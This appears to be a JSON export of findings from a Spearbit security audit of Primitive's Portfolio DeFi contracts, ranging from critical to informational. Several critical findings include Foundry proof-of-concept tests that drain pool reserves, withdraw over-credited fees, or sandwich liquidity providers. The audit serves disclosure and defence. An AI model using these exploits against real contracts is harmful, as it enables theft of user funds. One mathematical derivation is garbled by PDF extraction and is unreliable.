FVMLib.encodeAllocateOrDeallocate({ shouldAllocate: false, useMax: uint8(1), poolId: ghost().poolId, deltaLiquidity: 0 // useMax will set this to freeLiquidity }) ); subject().draw(ghost().asset().to_addr(), type(uint256).max, actor()); uint256 protocol_fee = ghost().balance(subjects().registry, ghost().asset().to_addr()); 5 assertEq(protocol_fee, amtIn / 100 / 5); // 20% of 1% of 1e18 // the global reserve is 0 even though the protocol fee should still exist uint256 reserve_asset = ghost().reserve(ghost().asset().to_addr()); assertEq(reserve_asset, 0); // reverts with InsufficientReserve(0, 2000000000000000) SimpleRegistry(subjects().registry).claimFee( address(subject()), ghost().asset().to_addr(), protocol_fee, address(this) ); } }", "labels": ["Spearbit", "Primitive", "Severity: Critical Risk"]}, {"title": "LP fees are in WAD instead of token decimal units", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Primitive-Spearbit-Security-Review.pdf", "body": "When swapping, deltaInput is in WAD (not token decimals) units. Therefore, feeAmount is also in WAD as a percentage of deltaInput. When calling _feeSavingEffects(args.poolId, iteration) to determine whether to reinvest the fees in the pool or earmark them for LPs, a _syncFeeGrowthAccumulator is done with the following parameter: _syncFeeGrowthAccumulator(FixedPointMathLib.divWadDown(iteration.feeAmount, iteration.liquidity)) This is a WAD per liquidity value stored in _state.feeGrowthGlobal and also in pool.feeGrowthGlobalAsset through a subsequent _syncPool call. If an LP claims now and their fees are synced with syncPositionFees, their tokensOwed is set to: uint256 differenceAsset = AssemblyLib.computeCheckpointDistance( feeGrowthAsset=pool.feeGrowthGlobalAsset, self.feeGrowthAssetLast ); feeAssetEarned = FixedPointMathLib.mulWadDown(differenceAsset, self.freeLiquidity); self.tokensOwedAsset += SafeCastLib.safeCastTo128(feeAssetEarned); Then tokensOwedAsset is increased by a WAD value (WAD per WAD liquidity multiplied by WAD liquidity) and they have credited this WAD value with _applyCredit(msg.sender, asset, claimedAssets) which they can then withdraw as a token decimal value. The result is that LP fees are credited and can be withdrawn as WAD units and tokens with fewer than 18 decimals can be stolen from the protocol. 6 // SPDX-License-Identifier: GPL-3.0-only pragma solidity ^0.8.4; import \"./Setup.sol\"; import \"forge-std/console2.sol\"; contract TestSpearbit is Setup { function test_fee_decimal_bug() public sixDecimalQuoteConfig useActor usePairTokens(31e18) allocateSome(100e18) // deltaLiquidity isArmed { // Understand current pool values. create pair initializes from price // DEFAULT_STRIKE=10e18 = 10.0 quote per asset = 1e7/1e18 = 1e-11 uint256 reserve_asset = ghost().reserve(ghost().asset().to_addr()); uint256 reserve_quote = ghost().reserve(ghost().quote().to_addr()); assertEq(reserve_asset, 30.859596948332370800e18); assertEq(reserve_quote, 308.595965e6); // Do swap from quote -> asset, so we catch fee on quote bool sellAsset = false; // amtIn is in quote. gets scaled to WAD in `_swap`. uint128 amtIn = 100; // 0.0001$ ~ 1e14 iteration.input uint128 amtOut = uint128(subject().getAmountOut(ghost().poolId, sellAsset, amtIn)); { } // verify that before swap, we have no credit uint256 credited = ghost().balance(actor(), ghost().quote().to_addr()); assertEq(credited, 0, \"token-credit\"); uint256 pre_swap_balance = ghost().quote().to_token().balanceOf(actor()); subject().multiprocess( FVMLib.encodeSwap( uint8(0), ghost().poolId, amtIn, amtOut, uint8(sellAsset ? 1 : 0) ) ); subject().multiprocess( // claim it all FVMLib.encodeClaim(ghost().poolId, type(uint128).max, type(uint128).max) ); // we got credited tokensOwed = 1% of 1e14 input = 1e12 quote tokens uint256 credited = ghost().balance(actor(), ghost().quote().to_addr()); assertEq(credited, 1e12, \"tokens-owed\"); // can withdraw the credited tokens, would underflow reserve, so just rug the entire reserve reserve_quote = ghost().reserve(ghost().quote().to_addr()); subject().draw(ghost().quote().to_addr(), reserve_quote, actor()); uint256 post_draw_balance = ghost().quote().to_token().balanceOf(actor()); // -amtIn because reserve_quote already got increased by it, otherwise we'd be double-counting assertEq(post_draw_balance, pre_swap_balance + reserve_quote - amtIn, ,! \"post-draw-balance-mismatch\"); 7 } }", "labels": ["Spearbit", "Primitive", "Severity: Critical Risk"]}, {"title": "Swaps can be done for free and steal the reserve given large liquidity allocation", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Primitive-Spearbit-Security-Review.pdf", "body": "A swap of inputDelta tokens for outputDelta tokens is accepted if the invariant after the swap did not decrease. The after-swap invariant is recomputed using the pools new virtual reserves (per liquidity) virtualX and virtualY: // becomes virtualX (reserveX) if swapping X -> Y nextIndependent = liveIndependent + deltaInput.divWadDown(iteration.liquidity); // becomes virtualY (reserveY) if swapping X -> Y nextDependent = liveDependent - deltaOutput.divWadDown(iteration.liquidity); // in checkInvariant int256 nextInvariant = RMM01Lib.invariantOf({ self: pools[poolId], R_x: reserveX, R_y: reserveY, timeRemainingSec: tau }); require(nextInvariantWad >= prevInvariant); When iteration.liquidity is sufficiently large the integer division deltaOutput.divWadDown(iteration.liquidity) will return 0, resulting in an unchanged pool reserve instead of a decreased one. The invariant check will pass even without transferring any input amount deltaInput as the reserves are unchanged. The swapper will be credited deltaOutput tokens. The attacker needs to first increase the liquidity to a large amount (>2**126 in the POC) such that they can steal the entire asset reserve (100e18 asset tokens in the POC): This can be done using multiprocess to: 1. allocate > 1.1e38 liquidity. 2. swap with input = 1 (to avoid the 0-swap revert) and output = 100e18. The new virtualX asset will be liveDependent - deltaOutput.divWadDown(iteration.liquidity) = liveDependent computed - 100e18 * 1e18 / 1.1e38 = liveDependent - 0 = liveDependent, leaving the virtual pool reserves unchanged and passing the invariant check. This credits 100e18 to the attacker when settled, as the global reserves (__account__.reserve) are decreased (but not the actual contract balance). as 3. deallocate the > 1.1e38 free liquidity again. As the virtual pool reserves virtualX/Y remained unchanged throughout the swap, the same allocated amount is credited again. Therefore, the allocation / deallocation doesnt require any token settlement. 4. settlement is called and the attacker needs to pay the swap input amount of 1 wei and is credited the global reserve decrease of 100e18 assets from the swap. Note that this attack requires a JIT parameter of zero in order to deallocate in the same block as the allocation. However, given sufficient capital combined with an extreme strike price or future cross-block flashloans, this attack 8 is also possible with JIT > 0. Attackers can perform this attack in their own pool with one malicious token and one token they want to steal. The malicious token comes with functionality to disable anyone else from trading so the attacker is the only one who can interact with their custom pool. This reduces any risk of this attack while waiting for the deallocation in a future block. // SPDX-License-Identifier: GPL-3.0-only pragma solidity ^0.8.4; import \"./Setup.sol\"; import \"contracts/libraries/RMM01Lib.sol\"; import \"forge-std/console2.sol\"; contract TestSpearbit is Setup { using RMM01Lib for PortfolioPool; // sorry, didn't know how to use the modifiers for testing 2 actors at the same time function test_virtual_reserve_unchanged_bug() public noJit defaultConfig { /////// SETUP /////// uint256 initialBalance = 100 * 1e18; address victim = address(actor()); vm.startPrank(victim); // we want to steal the victim's asset ghost().asset().prepare(address(victim), address(subject()), initialBalance); subject().fund(ghost().asset().to_addr(), initialBalance); vm.stopPrank(); // we need to prepare a tiny quote balance for attacker because we cannot set input = 0 for a swap ,! address attacker = address(0x54321); addGhostActor(attacker); setGhostActor(attacker); vm.startPrank(attacker); ghost().quote().prepare(address(attacker), address(subject()), 2); vm.stopPrank(); uint256 maxVirtual; { // get the virtualX/Y from pool creation PortfolioPool memory pool = ghost().pool(); (uint256 x, uint256 y) = pool.getVirtualPoolReservesPerLiquidityInWad(); console2.log(\"getVirtualPoolReservesPerLiquidityInWad: %s \\t %y \\t %s\", x, y); maxVirtual = y; } /////// ATTACK /////// // attacker provides max liquidity, swaps for free, removes liquidity, is credited funds vm.startPrank(attacker); bool sellAsset = false; uint128 amtIn = 1; uint128 amtOut = uint128(initialBalance); // victim's funds bytes[] memory instructions = new bytes[](3); uint8 counter = 0; instructions[counter++] = FVMLib.encodeAllocateOrDeallocate({ shouldAllocate: true, useMax: uint8(0), poolId: ghost().poolId, // getPoolLiquidityDeltas(int128 deltaLiquidity) does virtualY.mulDivUp(delta, scaleDownFactorAsset).safeCastTo128() ,! // virtualY * deltaLiquidity / 1e18 <= uint128.max => deltaLiquidity <= uint128.max * 1e18 ,! / virtualY. 9 // this will end up supplying deltaLiquidity such that the uint128 cast on deltaQuote won't overflow (deltaQuote ~ uint128.max) ,! // deltaLiquidity = 110267925102637245726655874254617279807 > 2**126 deltaLiquidity: uint128((uint256(type(uint128).max) * 1e18) / maxVirtual) }); // the main issue is that the invariant doesn't change, so the checkInvariant passes // the reason why the invariant doesn't change is because the virtualX/Y doesn't change // the reason why virtualY doesn't change even though we have deltaOutput = initialBalance (100e18) ,! // is that the previous allocate increased the liquidity so much that: // nextDependent = liveDependent - deltaOutput.divWadDown(iteration.liquidity) = liveDependent // the deltaOutput.divWadDown(iteration.liquidity) is 0 because: // 100e18 * 1e18 / 110267925102637245726655874254617279807 = 1e38 / 1.1e38 = 0 instructions[counter++] = FVMLib.encodeSwap(uint8(0), ghost().poolId, amtIn, amtOut, uint8(sellAsset ? 1 : 0)); ,! instructions[counter++] = FVMLib.encodeAllocateOrDeallocate({ shouldAllocate: false, useMax: uint8(1), poolId: ghost().poolId, deltaLiquidity: 0 // useMax makes us deallocate our entire freeLiquidity }); subject().multiprocess(FVM.encodeJumpInstruction(instructions)); uint256 attacker_asset_balance = ghost().balance(attacker, ghost().asset().to_addr()); assertGt(attacker_asset_balance, 0); console2.log(\"attacker asset profit: %s\", attacker_asset_balance); // attacker can withdraw victim's funds, leaving victim unable to withdraw subject().draw(ghost().asset().to_addr(), type(uint256).max, actor()); uint256 attacker_balance = ghost().asset().to_token().balanceOf(actor()); // rounding error of 1 assertEq(attacker_balance, initialBalance - 1, \"attacker-post-draw-balance-mismatch\"); vm.stopPrank(); } }", "labels": ["Spearbit", "Primitive", "Severity: Critical Risk"]}, {"title": "Unsafe type-casting", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Primitive-Spearbit-Security-Review.pdf", "body": "Throughout the contract weve encountered various unsafe type-castings.  invariant Within the _swap function, the next invariant is a int256 variable and is calculated within the checkInvariant function implemented in the RMM01Portfolio. This variable then is dangerously typecasted to int128 and assigned to a int256 variable in the iteration struct (L539). The down-casting from int256 to int128 assumes that the nextInvariantWad fits in a int128, in case it wont fit, it will overflow. The updated iteration object is passed to the _feeSavingEffects function, which based on the RMM implementation can lead to bad consequences.  iteration.nextInvariant  _getLatestInvariantAndVirtualPrice  getNetBalance During account settlement, getNetBalance is called to compute the difference between the \"physical reserves\" (contract balance) and the internal reserves: net = int256(physicalBalance) - int256(internalBalance). If the internalBalance > int256.max, it overflows into a negative value and the attacker is credited the entire physical balance + overflow upon settlement (and doesnt have to pay anything in settle). This might happen if an attacker allocates or swaps in very high amounts before settlement is called. Consider doing a safe typecast here as a legitimate possible revert would cause less issues than an actual overflow.  getNetBalance 11  Encoding / Decoding functions The encoding and decoding functions in FVMLib perform many unsafe typecasts and will truncate values. This can result in a user calling functions with unexpected parameters if they use a custom encoding. Consider using safe type-casts here.  encodeJumpInstruction: cannot encode more than 255 instructions, instructions will be cut off and they might perform an action that will then be settled unfavorably.  decodeClaim: fee0/fee1 can overflow  decodeCreatePool: price := mul(base1, exp(10, power1)) can overflow and pool is initialized wrong  decodeAllocateOrDeallocate: deltaLiquidity := mul(base, exp(10, power)) can overflow would pro- vide less liquidity  decodeSwap: input / output := mul(base1, exp(10, power1)) can overflow, potentially lead to unfavor- able swaps  Other  PortfolioLib.getPoolReserves: int128(self.liquidity). This could be a safe typecast, the function is not used internally.  AssemblyLib.toAmount: The typecast works if power < 39, otherwise leads to wrong results without revert- ing. This function is not used yet but consider performing a safe typecast here.", "labels": ["Spearbit", "Primitive", "Severity: High Risk"]}, {"title": "Protocol fees are in WAD instead of token decimal units", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Primitive-Spearbit-Security-Review.pdf", "body": "When swapping, deltaInput is in WAD (not token decimals) units. Therefore, the protocolFee will also be in WAD as a percentage of deltaInput. This WAD amount is then credited to the REGISTRY: iteration.feeAmount = (deltaInput * _state.fee) / PERCENTAGE; if (_protocolFee != 0) { uint256 protocolFeeAmount = iteration.feeAmount / _protocolFee; iteration.feeAmount -= protocolFeeAmount; _applyCredit(REGISTRY, _state.tokenInput, protocolFeeAmount); } The privileged registry can claim these fees using a withdrawal (draw) and the WAD units are not scaled back to token decimal units, resulting in withdrawing more fees than they should have received if the token has less than 18 decimals. This will reduce the global reserve by the increased fee amount and break the accounting and functionality of all pools using the token.", "labels": ["Spearbit", "Primitive", "Severity: High Risk"]}, {"title": "Invariant.getX computation is wrong", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Primitive-Spearbit-Security-Review.pdf", "body": "The protocol makes use of a solstat library to compute the off-chain swap amounts. The solstats Invariant.getX function documentation states: Computes x in x = 1 - (( (y + k) / K ) + ). However, the y + k term should be y - k. The off-chain swap amounts computed via getAmountOut return wrong values. Using these values for an actual swap transaction will either (wrongly) revert the swap or overstate the output amounts. Derivation: y = K (cid:8) (cid:0)(cid:8)(cid:0)1(1 (cid:8)(cid:0)1(y (cid:0) (cid:8) (cid:0)(cid:8)(cid:0)1(y x) (cid:27)p(cid:28) (cid:1) + k (cid:0) (cid:0) k )=K = (cid:8)(cid:0)1(1 x) (cid:27)p(cid:28) (cid:0) k)=K + (cid:27)p(cid:28) (cid:1) = 1 (cid:0) x (cid:0) (cid:0) (cid:8) (cid:0)(cid:8)(cid:0)1(y x = 1", "labels": ["Spearbit", "Primitive", "Severity: High Risk"]}, {"title": "Liquidity can be (de-)allocated at a bad price", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Primitive-Spearbit-Security-Review.pdf", "body": "To allocate liquidity to a pool, a single uint128 liquidityDelta parameter is specified. The re- quired deltaAsset and deltaQuote token amounts are computed from the current virtualX and virtualY token reserves per liquidity (prices). An MEV searcher can sandwich the allocation transaction with swaps that move the price in an unfavorable way, such that, the allocation happens at a time when the virtualX and virtualY variables are heavily skewed. The MEV searcher makes a profit and the liquidity provider will automatically be forced to use undesired token amounts. In the provided test case, the MEV searcher makes a profit of 2.12e18 X and the LP uses 9.08e18 X / 1.08 Y instead of the expected 3.08 X / 30.85 Y. LPs will incur a loss, especially if the asset (X) is currently far more valuable than the quote (Y). // SPDX-License-Identifier: GPL-3.0-only pragma solidity ^0.8.4; import \"./Setup.sol\"; import \"contracts/libraries/RMM01Lib.sol\"; import \"forge-std/console2.sol\"; contract TestSpearbit is Setup { using RMM01Lib for PortfolioPool; // sorry, didn't know how to use the modifiers for testing 2 actors at the same time function test_allocate_sandwich() public defaultConfig { uint256 initialBalance = 100e18; address victim = address(actor()); address mev = address(0x54321); ghost().asset().prepare(address(victim), address(subject()), initialBalance); ghost().quote().prepare(address(victim), address(subject()), initialBalance); addGhostActor(mev); setGhostActor(mev); vm.startPrank(mev); // need to prank here for approvals in `prepare` to work ghost().asset().prepare(address(mev), address(subject()), initialBalance); ghost().quote().prepare(address(mev), address(subject()), initialBalance); vm.stopPrank(); vm.startPrank(victim); subject().fund(ghost().asset().to_addr(), initialBalance); subject().fund(ghost().quote().to_addr(), initialBalance); vm.stopPrank(); vm.startPrank(mev); subject().fund(ghost().asset().to_addr(), initialBalance); subject().fund(ghost().quote().to_addr(), initialBalance); vm.stopPrank(); // 0. some user provides initial liquidity, so MEV can actually swap in the pool vm.startPrank(victim); subject().multiprocess( FVMLib.encodeAllocateOrDeallocate({ shouldAllocate: true, useMax: uint8(0), 14 poolId: ghost().poolId, deltaLiquidity: 10e18 }) ); vm.stopPrank(); // 1. MEV swaps, changing the virtualX/Y LP price (skewing the reserves) vm.startPrank(mev); uint128 amtIn = 6e18; bool sellAsset = true; uint128 amtOut = uint128(subject().getAmountOut(ghost().poolId, sellAsset, amtIn)); subject().multiprocess(FVMLib.encodeSwap(uint8(0), ghost().poolId, amtIn, amtOut, uint8(sellAsset ? 1 : 0))); ,! vm.stopPrank(); // 2. victim allocates { uint256 victim_asset_balance = ghost().balance(victim, ghost().asset().to_addr()); uint256 victim_quote_balance = ghost().balance(victim, ghost().quote().to_addr()); vm.startPrank(victim); subject().multiprocess( FVMLib.encodeAllocateOrDeallocate({ shouldAllocate: true, useMax: uint8(0), poolId: ghost().poolId, deltaLiquidity: 10e18 }) ); vm.stopPrank(); PortfolioPool memory pool = ghost().pool(); (uint256 x, uint256 y) = pool.getVirtualPoolReservesPerLiquidityInWad(); console2.log(\"getVirtualPoolReservesPerLiquidityInWad: %s \\t %y \\t %s\", x, y); victim_asset_balance -= ghost().balance(victim, ghost().asset().to_addr()); victim_quote_balance -= ghost().balance(victim, ghost().quote().to_addr()); console2.log( \"victim used asset/quote for allocate: %s \\t %y \\t %s\", victim_asset_balance, victim_quote_balance ); // w/o sandwich: 3e18 / 30e18 } // 3. MEV swaps back, ending up with more tokens than their initial balance vm.startPrank(mev); sellAsset = !sellAsset; amtIn = amtOut; // @audit-issue this only works after patching Invariant.getX to use y - k. still need to reduce the amtOut a tiny bit because of rounding errors ,! amtOut = uint128(subject().getAmountOut(ghost().poolId, sellAsset, amtIn)) * (1e4 - 1) / 1e4; subject().multiprocess(FVMLib.encodeSwap(uint8(0), ghost().poolId, amtIn, amtOut, uint8(sellAsset ? 1 : 0))); ,! vm.stopPrank(); uint256 mev_asset_balance = ghost().balance(mev, ghost().asset().to_addr()); uint256 mev_quote_balance = ghost().balance(mev, ghost().quote().to_addr()); assertGt(mev_asset_balance, initialBalance); assertGe(mev_quote_balance, initialBalance); console2.log( \"MEV asset/quote profit: %s \\t %s\", mev_asset_balance - initialBalance, mev_quote_balance - ,! initialBalance ); } 15 }", "labels": ["Spearbit", "Primitive", "Severity: High Risk"]}, {"title": "Missing signextend when dealing with non-full word signed integers", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Primitive-Spearbit-Security-Review.pdf", "body": "The AssemblyLib is using non-full word signed integers operations. If the signed data in the stack have not been signextend the twos complement arithmetic will not work properly, most probably reverting. The solidity compiler does this cleanup but this cleanup is not guaranteed to be done while using the inline assem- bly.", "labels": ["Spearbit", "Primitive", "Severity: Medium Risk"]}, {"title": "Tokens With Multiple Addresses Can Be Stolen Due to Reliance on balanceOf", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Primitive-Spearbit-Security-Review.pdf", "body": "Some ERC20 tokens have multiple valid contract addresses that serve as entrypoints for manipulat- ing the same underlying storage (such as Synthetix tokens like SNX and sBTC and the TUSD stablecoin). Because the FVM holds all tokens for all pools in the same contract, assumes that a contract address is a unique identifier for a token, and relies on the return value of balanceOf for manipulated tokens to determine what transfers are needed during transaction settlement, multiple entrypoint tokens are not safe to be used in pools. For example, suppose there is a pool with non-zero liquidity where one token has a second valid address. An attacker can atomically create a second pool using the alternate address, allocate liquidity, and then immediately deallocate it. During execution of the _settlement function, getNetBalance will return a positive net balance for the double entrypoint token, crediting the attacker and transferring them the entire balance of the double entrypoint token. This attack only costs gas, as the allocation and deallocation of non-double entrypoint tokens will cancel out.", "labels": ["Spearbit", "Primitive", "Severity: Medium Risk"]}, {"title": "Swap amounts are always estimated with priority fee", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Primitive-Spearbit-Security-Review.pdf", "body": "A pool can have a priority fee that is only applied when the pool controller (contract) performs a swap. However, when estimating a swap with getAmountOut the priority fee will always be applied as long as there is a controller and a priority fee. As the priority fee is usually less than the normal fee, the input amount will be underestimated for non-controllers and the input amount will be too low and the swap reverts.", "labels": ["Spearbit", "Primitive", "Severity: Medium Risk"]}, {"title": "Rounding functions are wrong for negative integers", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Primitive-Spearbit-Security-Review.pdf", "body": "The AssemblyLib.scaleFromWadUpSigned and AssemblyLib.scaleFromWadDownSigned both work on int256s and therefore also on negative integers. However, the rounding is wrong for these. Rounding down should mean rounding towards negative infinity, and rounding up should mean rounding towards positive infinity. The scaleFromWadDownSigned only performs a truncations, rounding negative integers towards zero. This function is used in checkInvariant to ensure the new invariant is not less than the new invariant in a swap: int256 liveInvariantWad = invariant.scaleFromWadDownSigned(pools[poolId].pair.decimalsQuote); int256 nextInvariantWad = nextInvariant.scaleFromWadDownSigned( pools[poolId].pair.decimalsQuote ); nextInvariantWad >= liveInvariantWad It can happen for quote tokens with fewer decimals, for example, 6 with USDC, that liveInvariantWad was rounded from a positive 0.9999e12 value to zero. And nextInvariantWad was rounded from a negative value of -0.9999e12 to zero. The check passes even though the invariant is violated by almost 2 quote token units.", "labels": ["Spearbit", "Primitive", "Severity: Medium Risk"]}, {"title": "LPs can lose fees if fee growth accumulator overflows their checkpoint", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Primitive-Spearbit-Security-Review.pdf", "body": "Fees (that are not reinvested in the pool) are currently tracked through an accumulator value pool.feeGrowthGlobalAsset and pool.feeGrowthGlobalQuote, computed as asset or quote per liquidity. Each user providing liquidity has a checkpoint of these values from their last sync (claim). When syncing new fees, the distance from the current value to the users checkpoint is computed and multiplied by their liquidity. The accumu- lator values are deliberately allowed to overflow as only the distance matters. However, if an LP does not sync its fees and the accumulator grows, overflows, and grows larger than their last checkpoint, the LP loses all fees. Example:  User allocates at pool.feeGrowthGlobalAsset = 1000e36  pool.feeGrowthGlobalAsset grows and overflows to 0. differenceAsset is still accurate.  pool.feeGrowthGlobalAsset grows more and is now at 1000e36 again. differenceAsset will be zero. If the user only claims their fees now, theyll earn 0 fees.", "labels": ["Spearbit", "Primitive", "Severity: Medium Risk"]}, {"title": "Unnecessary left shift in encodePoolId", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Primitive-Spearbit-Security-Review.pdf", "body": "The encodePoolId performs a left shift of 0. This is a noop.", "labels": ["Spearbit", "Primitive", "Severity: Gas Optimization"]}, {"title": "_syncPool performs unnecessary pool state updates", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Primitive-Spearbit-Security-Review.pdf", "body": "The _syncPool function is only called during a swap. During a swap the liquidity never changes and the pools last timestamp has already been updated in _beforeSwapEffects.", "labels": ["Spearbit", "Primitive", "Severity: Gas Optimization"]}, {"title": "Portfolio.sol gas optimizations", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Primitive-Spearbit-Security-Review.pdf", "body": "Throughout the contract weve identified a number of minor gas optimizations that can be performed. Weve gathered them into one issue to keep the issue number as small as possible.  L750 The msg.value > 0 check is done also in the __wrapEther__ call  L262 The following substitutions can be optimized in case assets are 0 by moving each instruction within the ifs on lines 256-266 pos.tokensOwedAsset -= claimedAssets.safeCastTo128(); pos.tokensOwedQuote -= claimedQuotes.safeCastTo128();  L376 Consider using the pool object (if it remains as a storage object) instead of pools[args.poolId]  L444:L445 The following two instructions can be grouped into one. output = args.output; output = output.scaleToWad(...  L436:L443 The internalBalance variable can be discarded due to the fact that it is used only within the input assignment. uint256 internalBalance = getBalance( msg.sender, _state.sell ? pool.pair.tokenAsset : pool.pair.tokenQuote ); input = args.useMax == 1 ? internalBalance : args.input; input = input.scaleToWad( _state.sell ? pool.pair.decimalsAsset : pool.pair.decimalsQuote );  L808 Assuming that the swap instruction will be one of the most used instructions, might be worth moving it as first if condition to save gas.  L409 The if (args.input == 0) revert ZeroInput(); can be removed as it will result in iteration.input being zero and reverting on L457.", "labels": ["Spearbit", "Primitive", "Severity: Gas Optimization"]}, {"title": "Incomplete NatSpec comments", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Primitive-Spearbit-Security-Review.pdf", "body": "Throughout the IPortofolio.sol interface, various NatSpec comments are missing or incomplete", "labels": ["Spearbit", "Primitive", "Severity: Informational"]}, {"title": "Inaccurate Comments", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Primitive-Spearbit-Security-Review.pdf", "body": "These comments are inaccurate. [1] The hex value on this line translates to v0.1.0-beta instead of v1.0.0-beta. [2] computeTau returns either the time until pool maturity, or zero if the pool is already expired. [3] These comments do not properly account for the two byte offset from the start of the array (in L94, only in the endpoint of the slice).", "labels": ["Spearbit", "Primitive", "Severity: Informational"]}, {"title": "Check for priorityFee should have its own custom error", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Primitive-Spearbit-Security-Review.pdf", "body": "The check for invalid priorityFee within the checkParameters function uses the same custom error as the one for fee. This could lead to confusion in the error output.", "labels": ["Spearbit", "Primitive", "Severity: Informational"]}, {"title": "Unclear @dev comment", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Primitive-Spearbit-Security-Review.pdf", "body": "This comment is misleading. It implies that cache is used to \"check\" state while it in fact changes it.", "labels": ["Spearbit", "Primitive", "Severity: Informational"]}, {"title": "Unused custom error", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Primitive-Spearbit-Security-Review.pdf", "body": "Unused error error AlreadySettled();", "labels": ["Spearbit", "Primitive", "Severity: Informational"]}, {"title": "Use named constants", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Primitive-Spearbit-Security-Review.pdf", "body": "The decodeSwap function compares a value against the constant 6. This value indicates the SWAP_- ASSET constant. sellAsset := eq(6, and(0x0F, byte(0, value)))", "labels": ["Spearbit", "Primitive", "Severity: Informational"]}, {"title": "scaleFromWadUp and scaleFromWadUpSigned can underflow", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Primitive-Spearbit-Security-Review.pdf", "body": "The scaleFromWadUp and scaleFromWadUpSigned will underflow if the amountWad parameter is 0 because they perform an unchecked subtraction on it: outputDec := add(div(sub(amountWad, 1), factor), 1) // ((a-1) / b) + 1", "labels": ["Spearbit", "Primitive", "Severity: Informational"]}, {"title": "AssemblyLib.pack does not clear lowers upper bits", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Primitive-Spearbit-Security-Review.pdf", "body": "The pack function packs the 4 lower bits of two bytes into a single byte. If the lower parameter has dirty upper bits, they will be mixed with the higher byte and be set on the final return value.", "labels": ["Spearbit", "Primitive", "Severity: Informational"]}, {"title": "AssemblyLib.toBytes8/16 functions assumes a max raw length of 16", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Primitive-Spearbit-Security-Review.pdf", "body": "The toBytes16 function only works if the length of the bytes raw parameter is at most 16 because of the unchcked subtraction: let shift := mul(sub(16, mload(raw)), 8) The same issue exists for the toBytes8 function.", "labels": ["Spearbit", "Primitive", "Severity: Informational"]}, {"title": "PortfolioLib.maturity returns wrong value for perpertual pools", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Primitive-Spearbit-Security-Review.pdf", "body": "A pool can be a perpetual pool that is modeled as a pool with a time to maturity always set to 1 year in the computeTau. However, the maturity function does not return this same maturity. This currently isnt a problem as maturity is only called from computeTau in case it is not a perpetual pool.", "labels": ["Spearbit", "Primitive", "Severity: Informational"]}, {"title": "_createPool has incomplete NatSpec and event args", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Primitive-Spearbit-Security-Review.pdf", "body": "The _createPool function contains incomplete NatSpec specifications. Furthermore, the event emitted by this function can be improved by adding more arguments.", "labels": ["Spearbit", "Primitive", "Severity: Informational"]}, {"title": "_liquidityPolicy is cast to a uint8 but it should be a uint16", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Primitive-Spearbit-Security-Review.pdf", "body": "During _createPool the pool curve parameters are set. One of them is the jit parameter which is a uint16. It can be assigned the default value of _liquidityPolicy but it is cast to a uint8. If the _liquidityPolicy constant is ever changed to a value greater than type(uint8).max a wrong jit value will be assigned.", "labels": ["Spearbit", "Primitive", "Severity: Informational"]}, {"title": "Update _feeSavingEffects documentation", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Primitive-Spearbit-Security-Review.pdf", "body": "The _feeSavingEffects documentation states: @return bool True if the fees were saved in positions owed tokens instead of re-invested.", "labels": ["Spearbit", "Primitive", "Severity: Informational"]}, {"title": "Document checkInvariant and resolve confusing naming", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Primitive-Spearbit-Security-Review.pdf", "body": "The checkInvariant functions return values are undocumented and the used variables names are confusing.", "labels": ["Spearbit", "Primitive", "Severity: Informational"]}, {"title": "Token amounts are in wrong decimals if useMax parameter is used", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Primitive-Spearbit-Security-Review.pdf", "body": "The allocate and swap functions have a useMax parameter that sets the token amounts to be used to the net balance of the contract. This net balance is the return value of a getNetBalance call, which is in token decimals. The code that follows (getPoolMaxLiquidity for allocate, iteration.input for swap) expects these amounts to be in WAD units. Using this parameter with tokens that don't have 18 decimals does not work correctly. The actual tokens used will be far lower than the expected amount to be used which will lead to user loss as the tokens remain in the contract after the action.", "labels": ["Spearbit", "Primitive", "Severity: High Risk"]}, {"title": "getAmountOut underestimates outputs leading to losses", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Primitive-Spearbit-Security-Review.pdf", "body": "When computing the output, the getAmountOut performs a bisection. However, this bisection returns any root of the function, not the lowest root. As the invariant is far from being strictly monotonic in R_x, it contains many neighbouring roots (> 2e9 in the example) and it's important to return the lowest root, corresponding to the lowest nextDependent, i.e., it leads to a larger output amount amountOut = prevDependent - nextDependent. Users using this function to estimate their outputs can incur significant losses.  Example: Calling getAmountOut(poolId, false, 1, 0, address(0)) with the pool configuration in the example will return amtOut = 123695775, whereas the real max possible amtOut for that swap is 33x higher at 4089008108. The core issue is that invariant is not strictly monotonic, invariant(R_x, R_y) = invariant(R_x + 2_852_- 050_358, R_y), there are many neighbouring roots for the pool configuration: function test_eval() public { uint128 R_y = 56075575; uint128 R_x = 477959654248878758; uint128 stk = 117322822; uint128 vol = 406600000000000000; uint128 tau = 2332800; int256 prev = Invariant.invariant({R_y: R_y, R_x: R_x, stk: stk, vol: vol, tau: tau}); // this is the actual dependent that still satisfies the invariant R_x -= 2_852_050_358; int256 post = Invariant.invariant({R_y: R_y, R_x: R_x, stk: stk, vol: vol, tau: tau}); 25 